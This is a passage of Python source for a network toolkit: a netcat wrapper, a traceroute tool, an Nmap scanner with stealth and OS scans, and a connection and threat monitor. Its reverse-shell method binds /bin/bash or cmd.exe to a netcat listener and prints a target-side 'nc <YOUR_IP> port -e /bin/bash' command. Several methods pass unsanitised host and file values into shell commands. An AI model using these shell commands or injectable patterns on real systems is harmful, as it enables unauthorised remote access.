                'error': f'Error executing netcat: {str(e)}'
            }
    
    def listen(self, port: int, verbose: bool = False, keep_alive: bool = False) -> Dict[str, Any]:
        """Start netcat listener"""
        args = ['-l', '-p', str(port)]
        if verbose:
            args.append('-v')
        if keep_alive:
            args.append('-k')
        
        return self.execute_netcat(args, timeout=3600)  # 1 hour timeout for listeners
    
    def connect(self, host: str, port: int, verbose: bool = False, timeout: int = 10) -> Dict[str, Any]:
        """Connect to host with netcat"""
        args = []
        if verbose:
            args.append('-v')
        if timeout:
            args.extend(['-w', str(timeout)])
        args.extend([host, str(port)])
        
        return self.execute_netcat(args, timeout=timeout + 5)
    
    def port_scan(self, host: str, start_port: int, end_port: int, verbose: bool = False) -> Dict[str, Any]:
        """Port scan with netcat"""
        open_ports = []
        
        for port in range(start_port, end_port + 1):
            args = ['-zv', host, str(port)]
            result = self.execute_netcat(args, timeout=5)
            
            if result['success']:
                open_ports.append(port)
                if verbose:
                    print(f"Port {port}: OPEN")
            elif verbose:
                print(f"Port {port}: CLOSED")
        
        return {
            'success': True,
            'host': host,
            'open_ports': open_ports,
            'total_ports': end_port - start_port + 1,
            'open_count': len(open_ports)
        }
    
    def file_transfer_receive(self, port: int, filename: str) -> Dict[str, Any]:
        """Receive file with netcat"""
        try:
            # Create a command to save received data to file
            cmd = f"{self.get_netcat_command()} -l -p {port} > {filename}"
            
            start_time = time.time()
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout for file transfer
            )
            execution_time = time.time() - start_time
            
            # Check if file was created
            file_received = os.path.exists(filename) and os.path.getsize(filename) > 0
            
            return {
                'success': file_received,
                'output': result.stdout if result.stdout else result.stderr,
                'execution_time': execution_time,
                'filename': filename,
                'file_size': os.path.getsize(filename) if file_received else 0
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'File receive error: {str(e)}'
            }
    
    def file_transfer_send(self, host: str, port: int, filename: str) -> Dict[str, Any]:
        """Send file with netcat"""
        if not os.path.exists(filename):
            return {
                'success': False,
                'error': f'File not found: {filename}'
            }
        
        try:
            cmd = f"{self.get_netcat_command()} {host} {port} < {filename}"
            
            start_time = time.time()
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout for file transfer
            )
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'execution_time': execution_time,
                'filename': filename,
                'file_size': os.path.getsize(filename)
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'File send error: {str(e)}'
            }
    
    def banner_grab(self, host: str, port: int) -> Dict[str, Any]:
        """Banner grabbing with netcat"""
        try:
            # Use timeout and send empty data
            cmd = f'echo "" | {self.get_netcat_command()} -v -n -w2 {host} {port}'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            banner = result.stdout if result.stdout else result.stderr
            
            return {
                'success': True,
                'host': host,
                'port': port,
                'banner': banner[:1000],  # Limit banner size
                'raw_output': banner
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Banner grab error: {str(e)}'
            }
    
    def http_get(self, host: str, path: str = "/", port: int = 80) -> Dict[str, Any]:
        """HTTP GET request with netcat"""
        try:
            http_request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            
            # Create a temporary file with the HTTP request
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(http_request)
                temp_file = f.name
            
            cmd = f"cat {temp_file} | {self.get_netcat_command()} {host} {port}"
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Clean up temp file
            os.unlink(temp_file)
            
            return {
                'success': True,
                'method': 'GET',
                'host': host,
                'port': port,
                'path': path,
                'response': result.stdout[:2000],  # Limit response size
                'status_code': self._extract_http_status(result.stdout)
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'HTTP GET error: {str(e)}'
            }
    
    def _extract_http_status(self, response: str) -> str:
        """Extract HTTP status code from response"""
        lines = response.split('\n')
        for line in lines:
            if line.startswith('HTTP/'):
                return line.strip()
        return "Unknown"
    
    def reverse_shell_listen(self, port: int) -> Dict[str, Any]:
        """Start reverse shell listener"""
        if platform.system().lower() == 'windows':
            cmd = f"{self.get_netcat_command()} -l -p {port} -e cmd.exe"
        else:
            cmd = f"{self.get_netcat_command()} -l -p {port} -e /bin/bash"
        
        print(f"⚠️ Starting reverse shell listener on port {port}")
        print(f"Command for target: {self.get_netcat_command()} <YOUR_IP> {port} -e /bin/bash")
        print("Press Ctrl+C to stop")
        
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                text=True,
                timeout=3600
            )
            return {
                'success': True,
                'output': "Reverse shell session ended"
            }
        except subprocess.TimeoutExpired:
            return {
                'success': True,
                'output': "Reverse shell listener timed out"
            }
        except KeyboardInterrupt:
            return {
                'success': True,
                'output': "Reverse shell stopped by user"
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Reverse shell error: {str(e)}'
            }
    
    def chat_server(self, port: int) -> Dict[str, Any]:
        """Start simple chat server"""
        print(f"💬 Chat server started on port {port}")
        print(f"Connect with: {self.get_netcat_command()} <SERVER_IP> {port}")
        print("Type 'exit' to quit")
        
        return self.listen(port, verbose=True, keep_alive=True)
    
    def get_templates(self) -> List[Dict]:
        """Get netcat templates from database"""
        if self.db:
            return self.db.get_netcat_templates()
        return []

# ============================================================================
# ENHANCED TRACEROUTE TOOL
# ============================================================================

class EnhancedTracerouteTool:
    """Enhanced interactive traceroute tool with advanced features"""
    
    def __init__(self, db_manager: DatabaseManager = None):
        self.db = db_manager
    
    @staticmethod
    def validate_target(target: str) -> Tuple[bool, str]:
        """Validate target IP or hostname"""
        # Check for empty
        if not target or not target.strip():
            return False, "Target cannot be empty"
        
        target = target.strip()
        
        # Check if it's an IP address
        try:
            ipaddress.ip_address(target)
            return True, "ip"
        except ValueError:
            pass
        
        # Check if it's a valid hostname
        if target.endswith('.'):
            target = target[:-1]
        
        # Enhanced hostname validation
        if len(target) > 253:
            return False, "Hostname too long"
        
        # Check each label
        labels = target.split('.')
        for label in labels:
            if len(label) > 63:
                return False, f"Label '{label}' too long"
            if label.startswith('-') or label.endswith('-'):
                return False, f"Label '{label}' cannot start or end with hyphen"
            if not re.match(r'^[a-zA-Z0-9-]+$', label):
                return False, f"Label '{label}' contains invalid characters"
            if not label:
                return False, "Empty label in hostname"
        
        return True, "hostname"
    
    @staticmethod
    def get_traceroute_command(target: str, options: Dict = None) -> List[str]:
        """Get appropriate traceroute command for the system"""
        if options is None:
            options = {}
        
        system = platform.system().lower()
        
        # Default options
        default_options = {
            'no_dns': True,
            'max_hops': 30,
            'timeout': 2,
            'queries': 1,
            'packet_size': 60
        }
        default_options.update(options)
        
        if system == 'windows':
            cmd = ['tracert']
            if default_options['no_dns']:
                cmd.append('-d')
            cmd.extend(['-h', str(default_options['max_hops'])])
            cmd.extend(['-w', str(default_options['timeout'] * 1000)])  # Windows uses milliseconds
            cmd.append(target)
        
        else:  # Unix-like systems
            # Try to find the best traceroute command
            if shutil.which('mtr'):
                cmd = ['mtr', '--report', '--report-cycles', '1']
                if default_options['no_dns']:
                    cmd.append('-n')
                cmd.extend(['-c', '1'])  # One cycle
                cmd.append(target)
            
            elif shutil.which('traceroute'):
                cmd = ['traceroute']
                if default_options['no_dns']:
                    cmd.append('-n')
                cmd.extend(['-q', str(default_options['queries'])])
                cmd.extend(['-w', str(default_options['timeout'])])
                cmd.extend(['-m', str(default_options['max_hops'])])
                cmd.extend(['-s', str(default_options['packet_size'])])
                cmd.append(target)
            
            elif shutil.which('tracepath'):
                cmd = ['tracepath']
                cmd.extend(['-m', str(default_options['max_hops'])])
                cmd.append(target)
            
            else:
                # Fallback to ping with TTL
                cmd = ['ping', '-c', '4', '-t', '1', target]
        
        return cmd
    
    def interactive_traceroute(self, target: str = None, options: Dict = None) -> str:
        """Run enhanced interactive traceroute"""
        if target is None:
            target = self._prompt_target()
            if not target:
                return "Traceroute cancelled."
        
        # Validate target
        is_valid, target_type = self.validate_target(target)
        if not is_valid:
            return f"❌ Invalid target: {target}"
        
        # Get command
        try:
            cmd = self.get_traceroute_command(target, options)
        except Exception as e:
            return f"❌ Failed to get traceroute command: {e}"
        
        print(f"\n{'='*60}")
        print(f"🚀 ENHANCED TRACEROUTE TO: {target}")
        print(f"📋 Command: {' '.join(cmd)}")
        print(f"📅 Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}\n")
        
        # Execute command
        start_time = time.time()
        result = self._execute_traceroute(cmd, target)
        execution_time = time.time() - start_time
        
        # Process results
        output = self._process_traceroute_output(result['output'], target)
        hops = self._count_hops(result['output'])
        
        # Log to database if available
        if self.db:
            self.db.log_traceroute(target, ' '.join(cmd), result['output'], 
                                 execution_time, hops)
        
        # Create formatted response
        response = self._format_traceroute_response(target, cmd, output, 
                                                  execution_time, result['returncode'], 
                                                  hops)
        
        return response
    
    def _prompt_target(self) -> Optional[str]:
        """Prompt user for target"""
        print("\n" + "="*60)
        print("🛣️  ENHANCED TRACEROUTE TOOL")
        print("="*60)
        
        while True:
            print("\nEnter target (IP address or hostname):")
            print("  Examples: 8.8.8.8, google.com, 2001:4860:4860::8888")
            print("  Type 'quit' or press Ctrl+C to cancel")
            print("-"*40)
            
            user_input = input("Target: ").strip()
            
            if not user_input:
                print("❌ Please enter a target")
                continue
            
            if user_input.lower() in ('q', 'quit', 'exit', 'cancel'):
                return None
            
            is_valid, target_type = self.validate_target(user_input)
            if is_valid:
                return user_input
            else:
                print(f"❌ Invalid target. Please enter a valid IP or hostname.")
    
    def _execute_traceroute(self, cmd: List[str], target: str) -> Dict:
        """Execute traceroute command with real-time output"""
        output_lines = []
        returncode = -1
        
        try:
            print(f"⏳ Running traceroute to {target}...\n")
            
            # Execute with real-time output
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Read output in real-time
            for line in proc.stdout:
                line = line.rstrip()
                output_lines.append(line)
                
                # Colorize output based on content
                if 'ms' in line or 'msec' in line:
                    # Time measurements - color based on latency
                    if any(x in line for x in ['*', '!', '?']):
                        print(f"{Fore.YELLOW}{line}{Style.RESET_ALL}")
                    elif any(x in line for x in ['<1', '0.', '1.', '2.', '3.', '4.', '5.']):
                        print(f"{Fore.GREEN}{line}{Style.RESET_ALL}")
                    elif any(x in line for x in ['10.', '20.', '30.', '40.', '50.']):
                        print(f"{Fore.YELLOW}{line}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}{line}{Style.RESET_ALL}")
                elif any(x in line for x in ['traceroute', 'tracert', 'mtr']):
                    print(f"{Fore.CYAN}{line}{Style.RESET_ALL}")
                elif any(x in line for x in ['Unable', 'Failed', 'Error', 'Timeout']):
                    print(f"{Fore.RED}{line}{Style.RESET_ALL}")
                else:
                    print(line)
            
            proc.wait()
            returncode = proc.returncode
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️  Traceroute interrupted by user{Style.RESET_ALL}")
            returncode = -1
            output_lines.append("\n[INTERRUPTED] User cancelled the traceroute")
        
        except Exception as e:
            error_msg = f"❌ Error executing traceroute: {e}"
            print(f"{Fore.RED}{error_msg}{Style.RESET_ALL}")
            output_lines.append(error_msg)
            returncode = -2
        
        return {
            'output': '\n'.join(output_lines),
            'returncode': returncode
        }
    
    def _process_traceroute_output(self, output: str, target: str) -> str:
        """Process and analyze traceroute output"""
        lines = output.split('\n')
        processed = []
        
        for line in lines:
            # Skip empty lines
            if not line.strip():
                processed.append(line)
                continue
            
            # Analyze each line
            processed_line = self._analyze_traceroute_line(line, target)
            processed.append(processed_line)
        
        return '\n'.join(processed)
    
    def _analyze_traceroute_line(self, line: str, target: str) -> str:
        """Analyze a single traceroute line"""
        line_lower = line.lower()
        
        # Check for timeout/errors
        if any(x in line_lower for x in ['*', 'request timed out', 'timeout', 'no response']):
            return f"{Fore.YELLOW}{line} ⚠️ (Timeout/No response){Style.RESET_ALL}"
        
        # Check for network errors
        if any(x in line_lower for x in ['destination unreachable', 'unreachable', '!h', '!n', '!p']):
            return f"{Fore.RED}{line} 🚫 (Destination unreachable){Style.RESET_ALL}"
        
        # Check for administrative prohibitions
        if any(x in line_lower for x in ['!a', 'administratively prohibited']):
            return f"{Fore.RED}{line} ⛔ (Administratively prohibited){Style.RESET_ALL}"
        
        # Check for successful hops with good latency
        if 'ms' in line or 'msec' in line:
            # Extract latency if present
            latency_match = re.search(r'(\d+\.?\d*)\s*(ms|msec)', line)
            if latency_match:
                latency = float(latency_match.group(1))
                if latency < 10:
                    return f"{Fore.GREEN}{line} ✅ (Excellent: <10ms){Style.RESET_ALL}"
                elif latency < 50:
                    return f"{Fore.GREEN}{line} ✓ (Good: <50ms){Style.RESET_ALL}"
                elif latency < 100:
                    return f"{Fore.YELLOW}{line} ⚠️ (Moderate: <100ms){Style.RESET_ALL}"
                else:
                    return f"{Fore.RED}{line} ⚠️ (High: >100ms){Style.RESET_ALL}"
        
        # Check for destination reached
        if target.lower() in line_lower and any(x in line_lower for x in ['reached', 'completed']):
            return f"{Fore.GREEN}{line} 🎯 (Destination reached!){Style.RESET_ALL}"
        
        return line
    
    def _count_hops(self, output: str) -> int:
        """Count number of hops in traceroute output"""
        lines = output.split('\n')
        hops = 0
        
        for line in lines:
            # Look for hop numbers (format: "1 ", "2 ", etc. at start of line)
            if re.match(r'^\s*\d+\s+', line):
                hops += 1
        
        return hops
    
    def _format_traceroute_response(self, target: str, cmd: List[str], 
                                   output: str, execution_time: float, 
                                   returncode: int, hops: int) -> str:
        """Format traceroute response for display/telegram"""
        
        response = f"""
{'='*60}
🛣️  TRACEROUTE RESULTS: {target}
{'='*60}

📋 COMMAND:
  {' '.join(cmd)}

⏱️  EXECUTION:
  Time: {execution_time:.2f} seconds
  Hops detected: {hops}
  Return code: {returncode}

📊 RESULTS:
{output}

{'='*60}
💡 INTERPRETATION:
  ✅ Green: Good latency (<50ms)
  ⚠️  Yellow: Moderate latency or timeouts
  🚫 Red: High latency or errors
  🎯 Green with target: Destination reached
{'='*60}
        """
        
        return response
    
    def batch_traceroute(self, targets: List[str], options: Dict = None) -> Dict[str, Any]:
        """Perform traceroute on multiple targets"""
        results = {
            'total': len(targets),
            'successful': 0,
            'failed': 0,
            'results': {}
        }
        
        print(f"\n{'='*60}")
        print(f"🔄 BATCH TRACEROUTE: {len(targets)} targets")
        print(f"{'='*60}\n")
        
        for i, target in enumerate(targets, 1):
            print(f"\n[{i}/{len(targets)}] Traceroute to {target}")
            print(f"{'-'*40}")
            
            try:
                result = self.interactive_traceroute(target, options)
                results['results'][target] = result
                results['successful'] += 1
                
                # Extract hops from result
                lines = result.split('\n')
                for line in lines:
                    if 'Hops detected:' in line:
                        hops = line.split(':')[1].strip()
                        print(f"   Hops: {hops}")
                        break
                
            except Exception as e:
                error_msg = f"❌ Failed to traceroute {target}: {e}"
                results['results'][target] = error_msg
                results['failed'] += 1
                print(f"   {error_msg}")
        
        print(f"\n{'='*60}")
        print(f"📊 BATCH COMPLETE: {results['successful']} successful, {results['failed']} failed")
        print(f"{'='*60}")
        
        return results

# ============================================================================
# ADVANCED NETWORK SCANNER
# ============================================================================

class AdvancedNetworkScanner:
    """Advanced network scanning with Nmap integration"""
    
    def __init__(self, db_manager: DatabaseManager = None):
        self.db = db_manager
        self.traceroute_tool = EnhancedTracerouteTool(db_manager)
        self.nmap_available = self.check_nmap_installation()
    
    def check_nmap_installation(self) -> bool:
        """Check if Nmap is installed and accessible"""
        try:
            result = subprocess.run(
                ['nmap', '--version'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                logger.info(f"Nmap is installed: {result.stdout[:100]}")
                return True
            else:
                logger.warning("Nmap is not installed or not in PATH")
                return False
                
        except Exception as e:
            logger.error(f"Nmap check failed: {str(e)}")
            return False
    
    def execute_command(self, cmd: List[str]) -> Dict[str, Any]:
        """Execute shell command and capture output"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout for long scans
            )
            
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'execution_time': execution_time,
                'return_code': result.returncode
            }
            
        except subprocess.TimeoutExpired:
            execution_time = time.time() - start_time
            return {
                'success': False,
                'output': 'Command timed out after 5 minutes',
                'execution_time': execution_time,
                'return_code': -1
            }
        except Exception as e:
            execution_time = time.time() - start_time
            return {
                'success': False,
                'output': f'Error: {str(e)}',
                'execution_time': execution_time,
                'return_code': -2
            }
    
    def perform_nmap_scan(self, target: str, scan_type: str, options: Dict = None) -> ScanResult:
        """Perform Nmap scan with specified type"""
        import hashlib
        
        scan_id = hashlib.md5(f"{target}{scan_type}{time.time()}".encode()).hexdigest()[:16]
        
        # Get scan options
        if scan_type in NMAP_SCAN_TYPES:
            scan_options = NMAP_SCAN_TYPES[scan_type]
        else:
            scan_options = scan_type  # Custom scan type
        
        # Build command
        cmd = ['nmap', target] + scan_options.split()
        
        if options and 'ports' in options:
            # Remove -F if present and add custom ports
            if '-F' in cmd:
                cmd.remove('-F')
            cmd.extend(['-p', options['ports']])
        
        if options and 'timing' in options:
            cmd.extend(['-T', str(options['timing'])])
        
        logger.info(f"Running Nmap scan: {' '.join(cmd)}")
        
        start_time = time.time()
        try:
            result = self.execute_command(cmd)
            
            parsed_result = self.parse_nmap_output(result['output'])
            vulnerabilities = self.analyze_vulnerabilities(parsed_result)
            
            return ScanResult(
                scan_id=scan_id,
                success=result['success'],
                target=target,
                scan_type=scan_type,
                cmd=' '.join(cmd),
                execution_time=result['execution_time'],
                result=parsed_result,
                vulnerabilities=vulnerabilities,
                raw_output=result['output'][:5000],
                timestamp=datetime.datetime.now().isoformat()
            )
            
        except Exception as e:
            return ScanResult(
                scan_id=scan_id,
                success=False,
                target=target,
                scan_type=scan_type,
                cmd=' '.join(cmd),
                execution_time=time.time() - start_time,
                result={},
                vulnerabilities=[],
                raw_output=f'Error: {str(e)}',
                timestamp=datetime.datetime.now().isoformat()
            )
    
    def parse_nmap_output(self, output: str) -> Dict[str, Any]:
        """Parse Nmap output into structured data"""
        lines = output.split('\n')
        result = {
            'host': '',
            'status': '',
            'addresses': [],
            'ports': [],
            'os': '',
            'services': []
        }
        
        current_port = None
        
        for line in lines:
            # Parse Nmap report header
            if 'Nmap scan report for' in line:
                result['host'] = line.replace('Nmap scan report for', '').strip()
            elif 'Host is up' in line:
                result['status'] = 'up'
            elif 'Host seems down' in line:
                result['status'] = 'down'
            elif re.match(r'^\d+/(tcp|udp)\s+(open|closed|filtered)', line):
                parts = line.strip().split()
                if len(parts) >= 3:
                    port_parts = parts[0].split('/')
                    current_port = {
                        'port': int(port_parts[0]),
                        'protocol': port_parts[1],
                        'state': parts[1],
                        'service': parts[2] if len(parts) > 2 else 'unknown'
                    }
                    result['ports'].append(current_port)
            elif 'Service Info:' in line:
                result['os'] = line.replace('Service Info:', '').strip()
            elif current_port and line.strip().startswith('|'):
                # Service version info
                current_port['version'] = line.strip()[1:].strip()
        
        return result
    
    def analyze_vulnerabilities(self, scan_result: Dict) -> List[Dict]:
        """Analyze scan results for potential vulnerabilities"""
        vulnerabilities = []
        critical_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3389, 5900, 8080, 8443]
        weak_services = ['telnet', 'ftp', 'smtp', 'pop3', 'imap', 'vnc', 'snmp']
        
        for port_info in scan_result.get('ports', []):
            vuln = {'port': port_info['port'], 'issues': []}
            
            # Check for critical ports
            if port_info['port'] in critical_ports and port_info['state'] == 'open':
                vuln['issues'].append(f"Critical port {port_info['port']} is open")
            
            # Check for weak services
            if any(weak in port_info['service'].lower() for weak in weak_services):
                vuln['issues'].append(f"Weak service {port_info['service']} detected")
            
            # Check for default credentials services
            if 'http' in port_info['service'].lower() or 'web' in port_info['service'].lower():
                vuln['issues'].append("Web service detected - check for default credentials")
            
            # Check for outdated versions
            if 'version' in port_info and any(x in port_info['version'].lower() for x in ['old', 'beta', 'test', 'debug']):
                vuln['issues'].append(f"Potential outdated version: {port_info['version']}")
            
            if vuln['issues']:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def network_discovery(self, network_range: str) -> Dict[str, Any]:
        """Discover hosts in network range"""
        cmd = ['nmap', '-sn', network_range]
        
        try:
            result = self.execute_command(cmd)
            
            if not result['success']:
                return {'success': False, 'error': result['output']}
            
            lines = result['output'].split('\n')
            hosts = []
            
            for line in lines:
                ip_match = re.search(r'Nmap scan report for (?:[a-zA-Z0-9.-]+ )?\(?(\d+\.\d+\.\d+\.\d+)\)?', line)
                if ip_match:
                    hosts.append(ip_match.group(1))
            
            return {
                'success': True,
                'network': network_range,
                'hosts': hosts,
                'count': len(hosts),
                'execution_time': result['execution_time'],
                'raw_output': result['output']
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def stealth_scan(self, target: str) -> Dict[str, Any]:
        """Perform stealth SYN scan"""
        cmd = ['nmap', '-sS', '-T2', '-f', target]
        
        try:
            result = self.execute_command(cmd)
            
            return {
                'success': result['success'],
                'target': target,
                'scan_type': 'stealth',
                'execution_time': result['execution_time'],
                'output': result['output'],
                'raw_output': result['output'][:3000]
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def os_detection(self, target: str) -> Dict[str, Any]:
        """Perform OS detection"""
        cmd = ['nmap', '-O', '--osscan-guess', target]
        
        try:
            result = self.execute_command(cmd)
            
            return {
                'success': result['success'],
                'target': target,
                'scan_type': 'os_detection',
                'execution_time': result['execution_time'],
                'output': result['output'],
                'raw_output': result['output'][:3000]
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def service_detection(self, target: str) -> Dict[str, Any]:
        """Perform service version detection"""
        cmd = ['nmap', '-sV', '--version-intensity', '5', target]
        
        try:
            result = self.execute_command(cmd)
            
            return {
                'success': result['success'],
                'target': target,
                'scan_type': 'service_detection',
                'execution_time': result['execution_time'],
                'output': result['output'],
                'raw_output': result['output'][:3000]
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def save_scan_to_file(self, scan_result: ScanResult, filename: str = None) -> str:
        """Save scan result to file"""
        if not filename:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_{scan_result.target.replace('.', '_')}_{timestamp}.json"
        
        filepath = Path(SCAN_RESULTS_DIR) / filename
        
        with open(filepath, 'w') as f:
            json.dump(asdict(scan_result), f, indent=2, default=str)
        
        logger.info(f"Scan saved to: {filepath}")
        return str(filepath)

# ============================================================================
# NETWORK MONITOR & THREAT DETECTION
# ============================================================================

class NetworkMonitor:
    """Network monitoring and threat detection system"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10),
            'syn_flood': self.config.get('monitoring', {}).get('syn_flood_threshold', 100),
            'udp_flood': self.config.get('monitoring', {}).get('udp_flood_threshold', 500),
            'http_flood': self.config.get('monitoring', {}).get('http_flood_threshold', 200),
            'ddos': self.config.get('monitoring', {}).get('ddos_threshold', 1000)
        }
        self.counters = {}
        self.threads = []
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            logger.warning("Monitoring already running")
            return
        
        self.monitoring = True
        logger.info("Starting network monitoring...")
        
        # Start monitoring threads
        self.threads = [
            threading.Thread(target=self._monitor_port_scans, daemon=True),
            threading.Thread(target=self._monitor_syn_floods, daemon=True),
            threading.Thread(target=self._monitor_connections, daemon=True),
            threading.Thread(target=self._monitor_system_metrics, daemon=True),
            threading.Thread(target=self._monitor_logged_ips, daemon=True)
        ]
        
        for thread in self.threads:
            thread.start()
        
        logger.info(f"Network monitoring started with {len(self.threads)} threads")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        
        # Wait for threads to finish
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads = []
        logger.info("Network monitoring stopped")
    
    def add_ip_to_monitoring(self, ip: str) -> bool:
        """Add IP to monitoring list"""
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            
            # Also add to database
            if self.db:
                self.db.add_monitored_ip(ip, "Added via monitoring")
            
            logger.info(f"Added IP to monitoring: {ip}")
            return True
        
        except ValueError:
            logger.error(f"Invalid IP address: {ip}")
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring list"""
        if ip in self.monitored_ips:
            self.monitored_ips.remove(ip)
            
            # Mark as inactive in database
            if self.db:
                self.db.remove_monitored_ip(ip)
            
            logger.info(f"Removed IP from monitoring: {ip}")
            return True
        
        return False
    
    def get_monitored_ips(self) -> List[str]:
        """Get list of monitored IPs"""
        return sorted(self.monitored_ips)
    
    def _monitor_port_scans(self):
        """Monitor for port scanning activity"""
        logger.info("Port scan monitor started")
        
        port_attempts = {}
        
        while self.monitoring:
            try:
                # Get current connections
                connections = psutil.net_connections()
                
                # Analyze connections for port scan patterns
                source_ports = {}
                for conn in connections:
                    if conn.raddr:  # Has remote address
                        source_ip = conn.raddr.ip
                        if source_ip not in source_ports:
                            source_ports[source_ip] = set()
                        source_ports[source_ip].add(conn.raddr.port)
                
                # Check for port scan patterns
                current_time = time.time()
                for source_ip, ports in source_ports.items():
                    num_ports = len(ports)
                    
                    if num_ports > self.thresholds['port_scan']:
                        # Potential port scan detected
                        if source_ip not in port_attempts:
                            port_attempts[source_ip] = {'count': 0, 'first_seen': current_time}
                        
                        port_attempts[source_ip]['count'] += 1
                        
                        # If we've seen multiple port scans from this IP, create alert
                        if port_attempts[source_ip]['count'] >= 3:
                            self._create_threat_alert(
                                threat_type="Port Scan",
                                source_ip=source_ip,
                                severity="high",
                                description=f"Multiple port scans detected. Scanned {num_ports} ports.",
                                action_taken="Logged and monitoring"
                            )
                            port_attempts[source_ip]['count'] = 0  # Reset counter
                
                # Cleanup old entries (older than 5 minutes)
                cleanup_time = current_time - 300
                expired_ips = [ip for ip, data in port_attempts.items() 
                              if data['first_seen'] < cleanup_time]
                for ip in expired_ips:
                    del port_attempts[ip]
                
                time.sleep(60)  # Check every minute
            
            except Exception as e:
                logger.error(f"Port scan monitor error: {e}")
                time.sleep(10)
    
    def _monitor_syn_floods(self):
        """Monitor for SYN flood attacks"""
        logger.info("SYN flood monitor started")
        
        syn_counts = {}
        
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                syn_connections = [c for c in connections if c.status == 'SYN_SENT']
                
                # Count SYN connections per source
                for conn in syn_connections:
                    if conn.raddr:
                        source_ip = conn.raddr.ip
                        syn_counts[source_ip] = syn_counts.get(source_ip, 0) + 1
                
                # Check thresholds
                current_time = time.time()
                for source_ip, count in list(syn_counts.items()):
                    if count > self.thresholds['syn_flood']:
                        self._create_threat_alert(
                            threat_type="SYN Flood",
                            source_ip=source_ip,
                            severity="high",
                            description=f"SYN flood detected. {count} SYN packets from this IP.",
                            action_taken="Logged"
                        )
                        syn_counts[source_ip] = 0  # Reset counter
                
                # Cleanup counters every 30 seconds
                if current_time % 30 < 1:  # Every 30 seconds
                    syn_counts.clear()
                
                time.sleep(5)  # Check every 5 seconds
            
            except Exception as e:
                logger.error(f"SYN flood monitor error: {e}")
                time.sleep(10)
    
    def _monitor_connections(self):
        """Monitor network connections"""
        logger.info("Connection monitor started")
        
        while self.monitoring:
            try:
                connections = psutil.net_connections()
                
                # Log interesting connections to database
                for conn in connections[:50]:  # Limit to first 50 connections
                    if conn.raddr and self.db:
                        net_conn = NetworkConnection(
                            local_ip=conn.laddr.ip if conn.laddr else "",
                            local_port=conn.laddr.port if conn.laddr else 0,
                            remote_ip=conn.raddr.ip,
                            remote_port=conn.raddr.port,
                            status=conn.status,
                            process_name="",
                            protocol=conn.type.name if hasattr(conn.type, 'name') else str(conn.type)
                        )
                        
                        # Try to get process name
                        try:
                            if conn.pid:
                                proc = psutil.Process(conn.pid)
                                net_conn.process_name = proc.name()
                        except:
                            pass
                        
                        self.db.log_connection(net_conn)
                
                time.sleep(30)  # Check every 30 seconds
            
            except Exception as e:
                logger.error(f"Connection monitor error: {e}")
                time.sleep(10)
    
    def _monitor_system_metrics(self):
        """Monitor system metrics"""
        logger.info("System metrics monitor started")
        
        while self.monitoring:
            try:
                if self.db:
                    self.db.log_system_metrics()
                
                # Check for high resource usage
                cpu = psutil.cpu_percent(interval=1)
                mem = psutil.virtual_memory()
                
                if cpu > 90:
                    self._create_threat_alert(
                        threat_type="High CPU Usage",
                        source_ip="localhost",
                        severity="medium",
                        description=f"CPU usage at {cpu}%",
                        action_taken="Logged"
                    )
                
                if mem.percent > 90:
                    self._create_threat_alert(
                        threat_type="High Memory Usage",
                        source_ip="localhost",
                        severity="medium",
                        description=f"Memory usage at {mem.percent}%",
                        action_taken="Logged"
                    )
                
                time.sleep(60)  # Check every minute
            
            except Exception as e:
                logger.error(f"System metrics monitor error: {e}")
                time.sleep(10)
    
    def _monitor_logged_ips(self):
        """Monitor IPs logged in database"""
        logger.info("Logged IPs monitor started")
        
        while self.monitoring:
            try:
                if self.db:
                    # Get monitored IPs from database
                    db_ips = self.db.get_monitored_ips(active_only=True)
                    for ip_info in db_ips:
                        ip = ip_info.get('ip_address')
                        if ip and ip not in self.monitored_ips:
                            self.monitored_ips.add(ip)
                
                time.sleep(300)  # Check every 5 minutes
            
            except Exception as e:
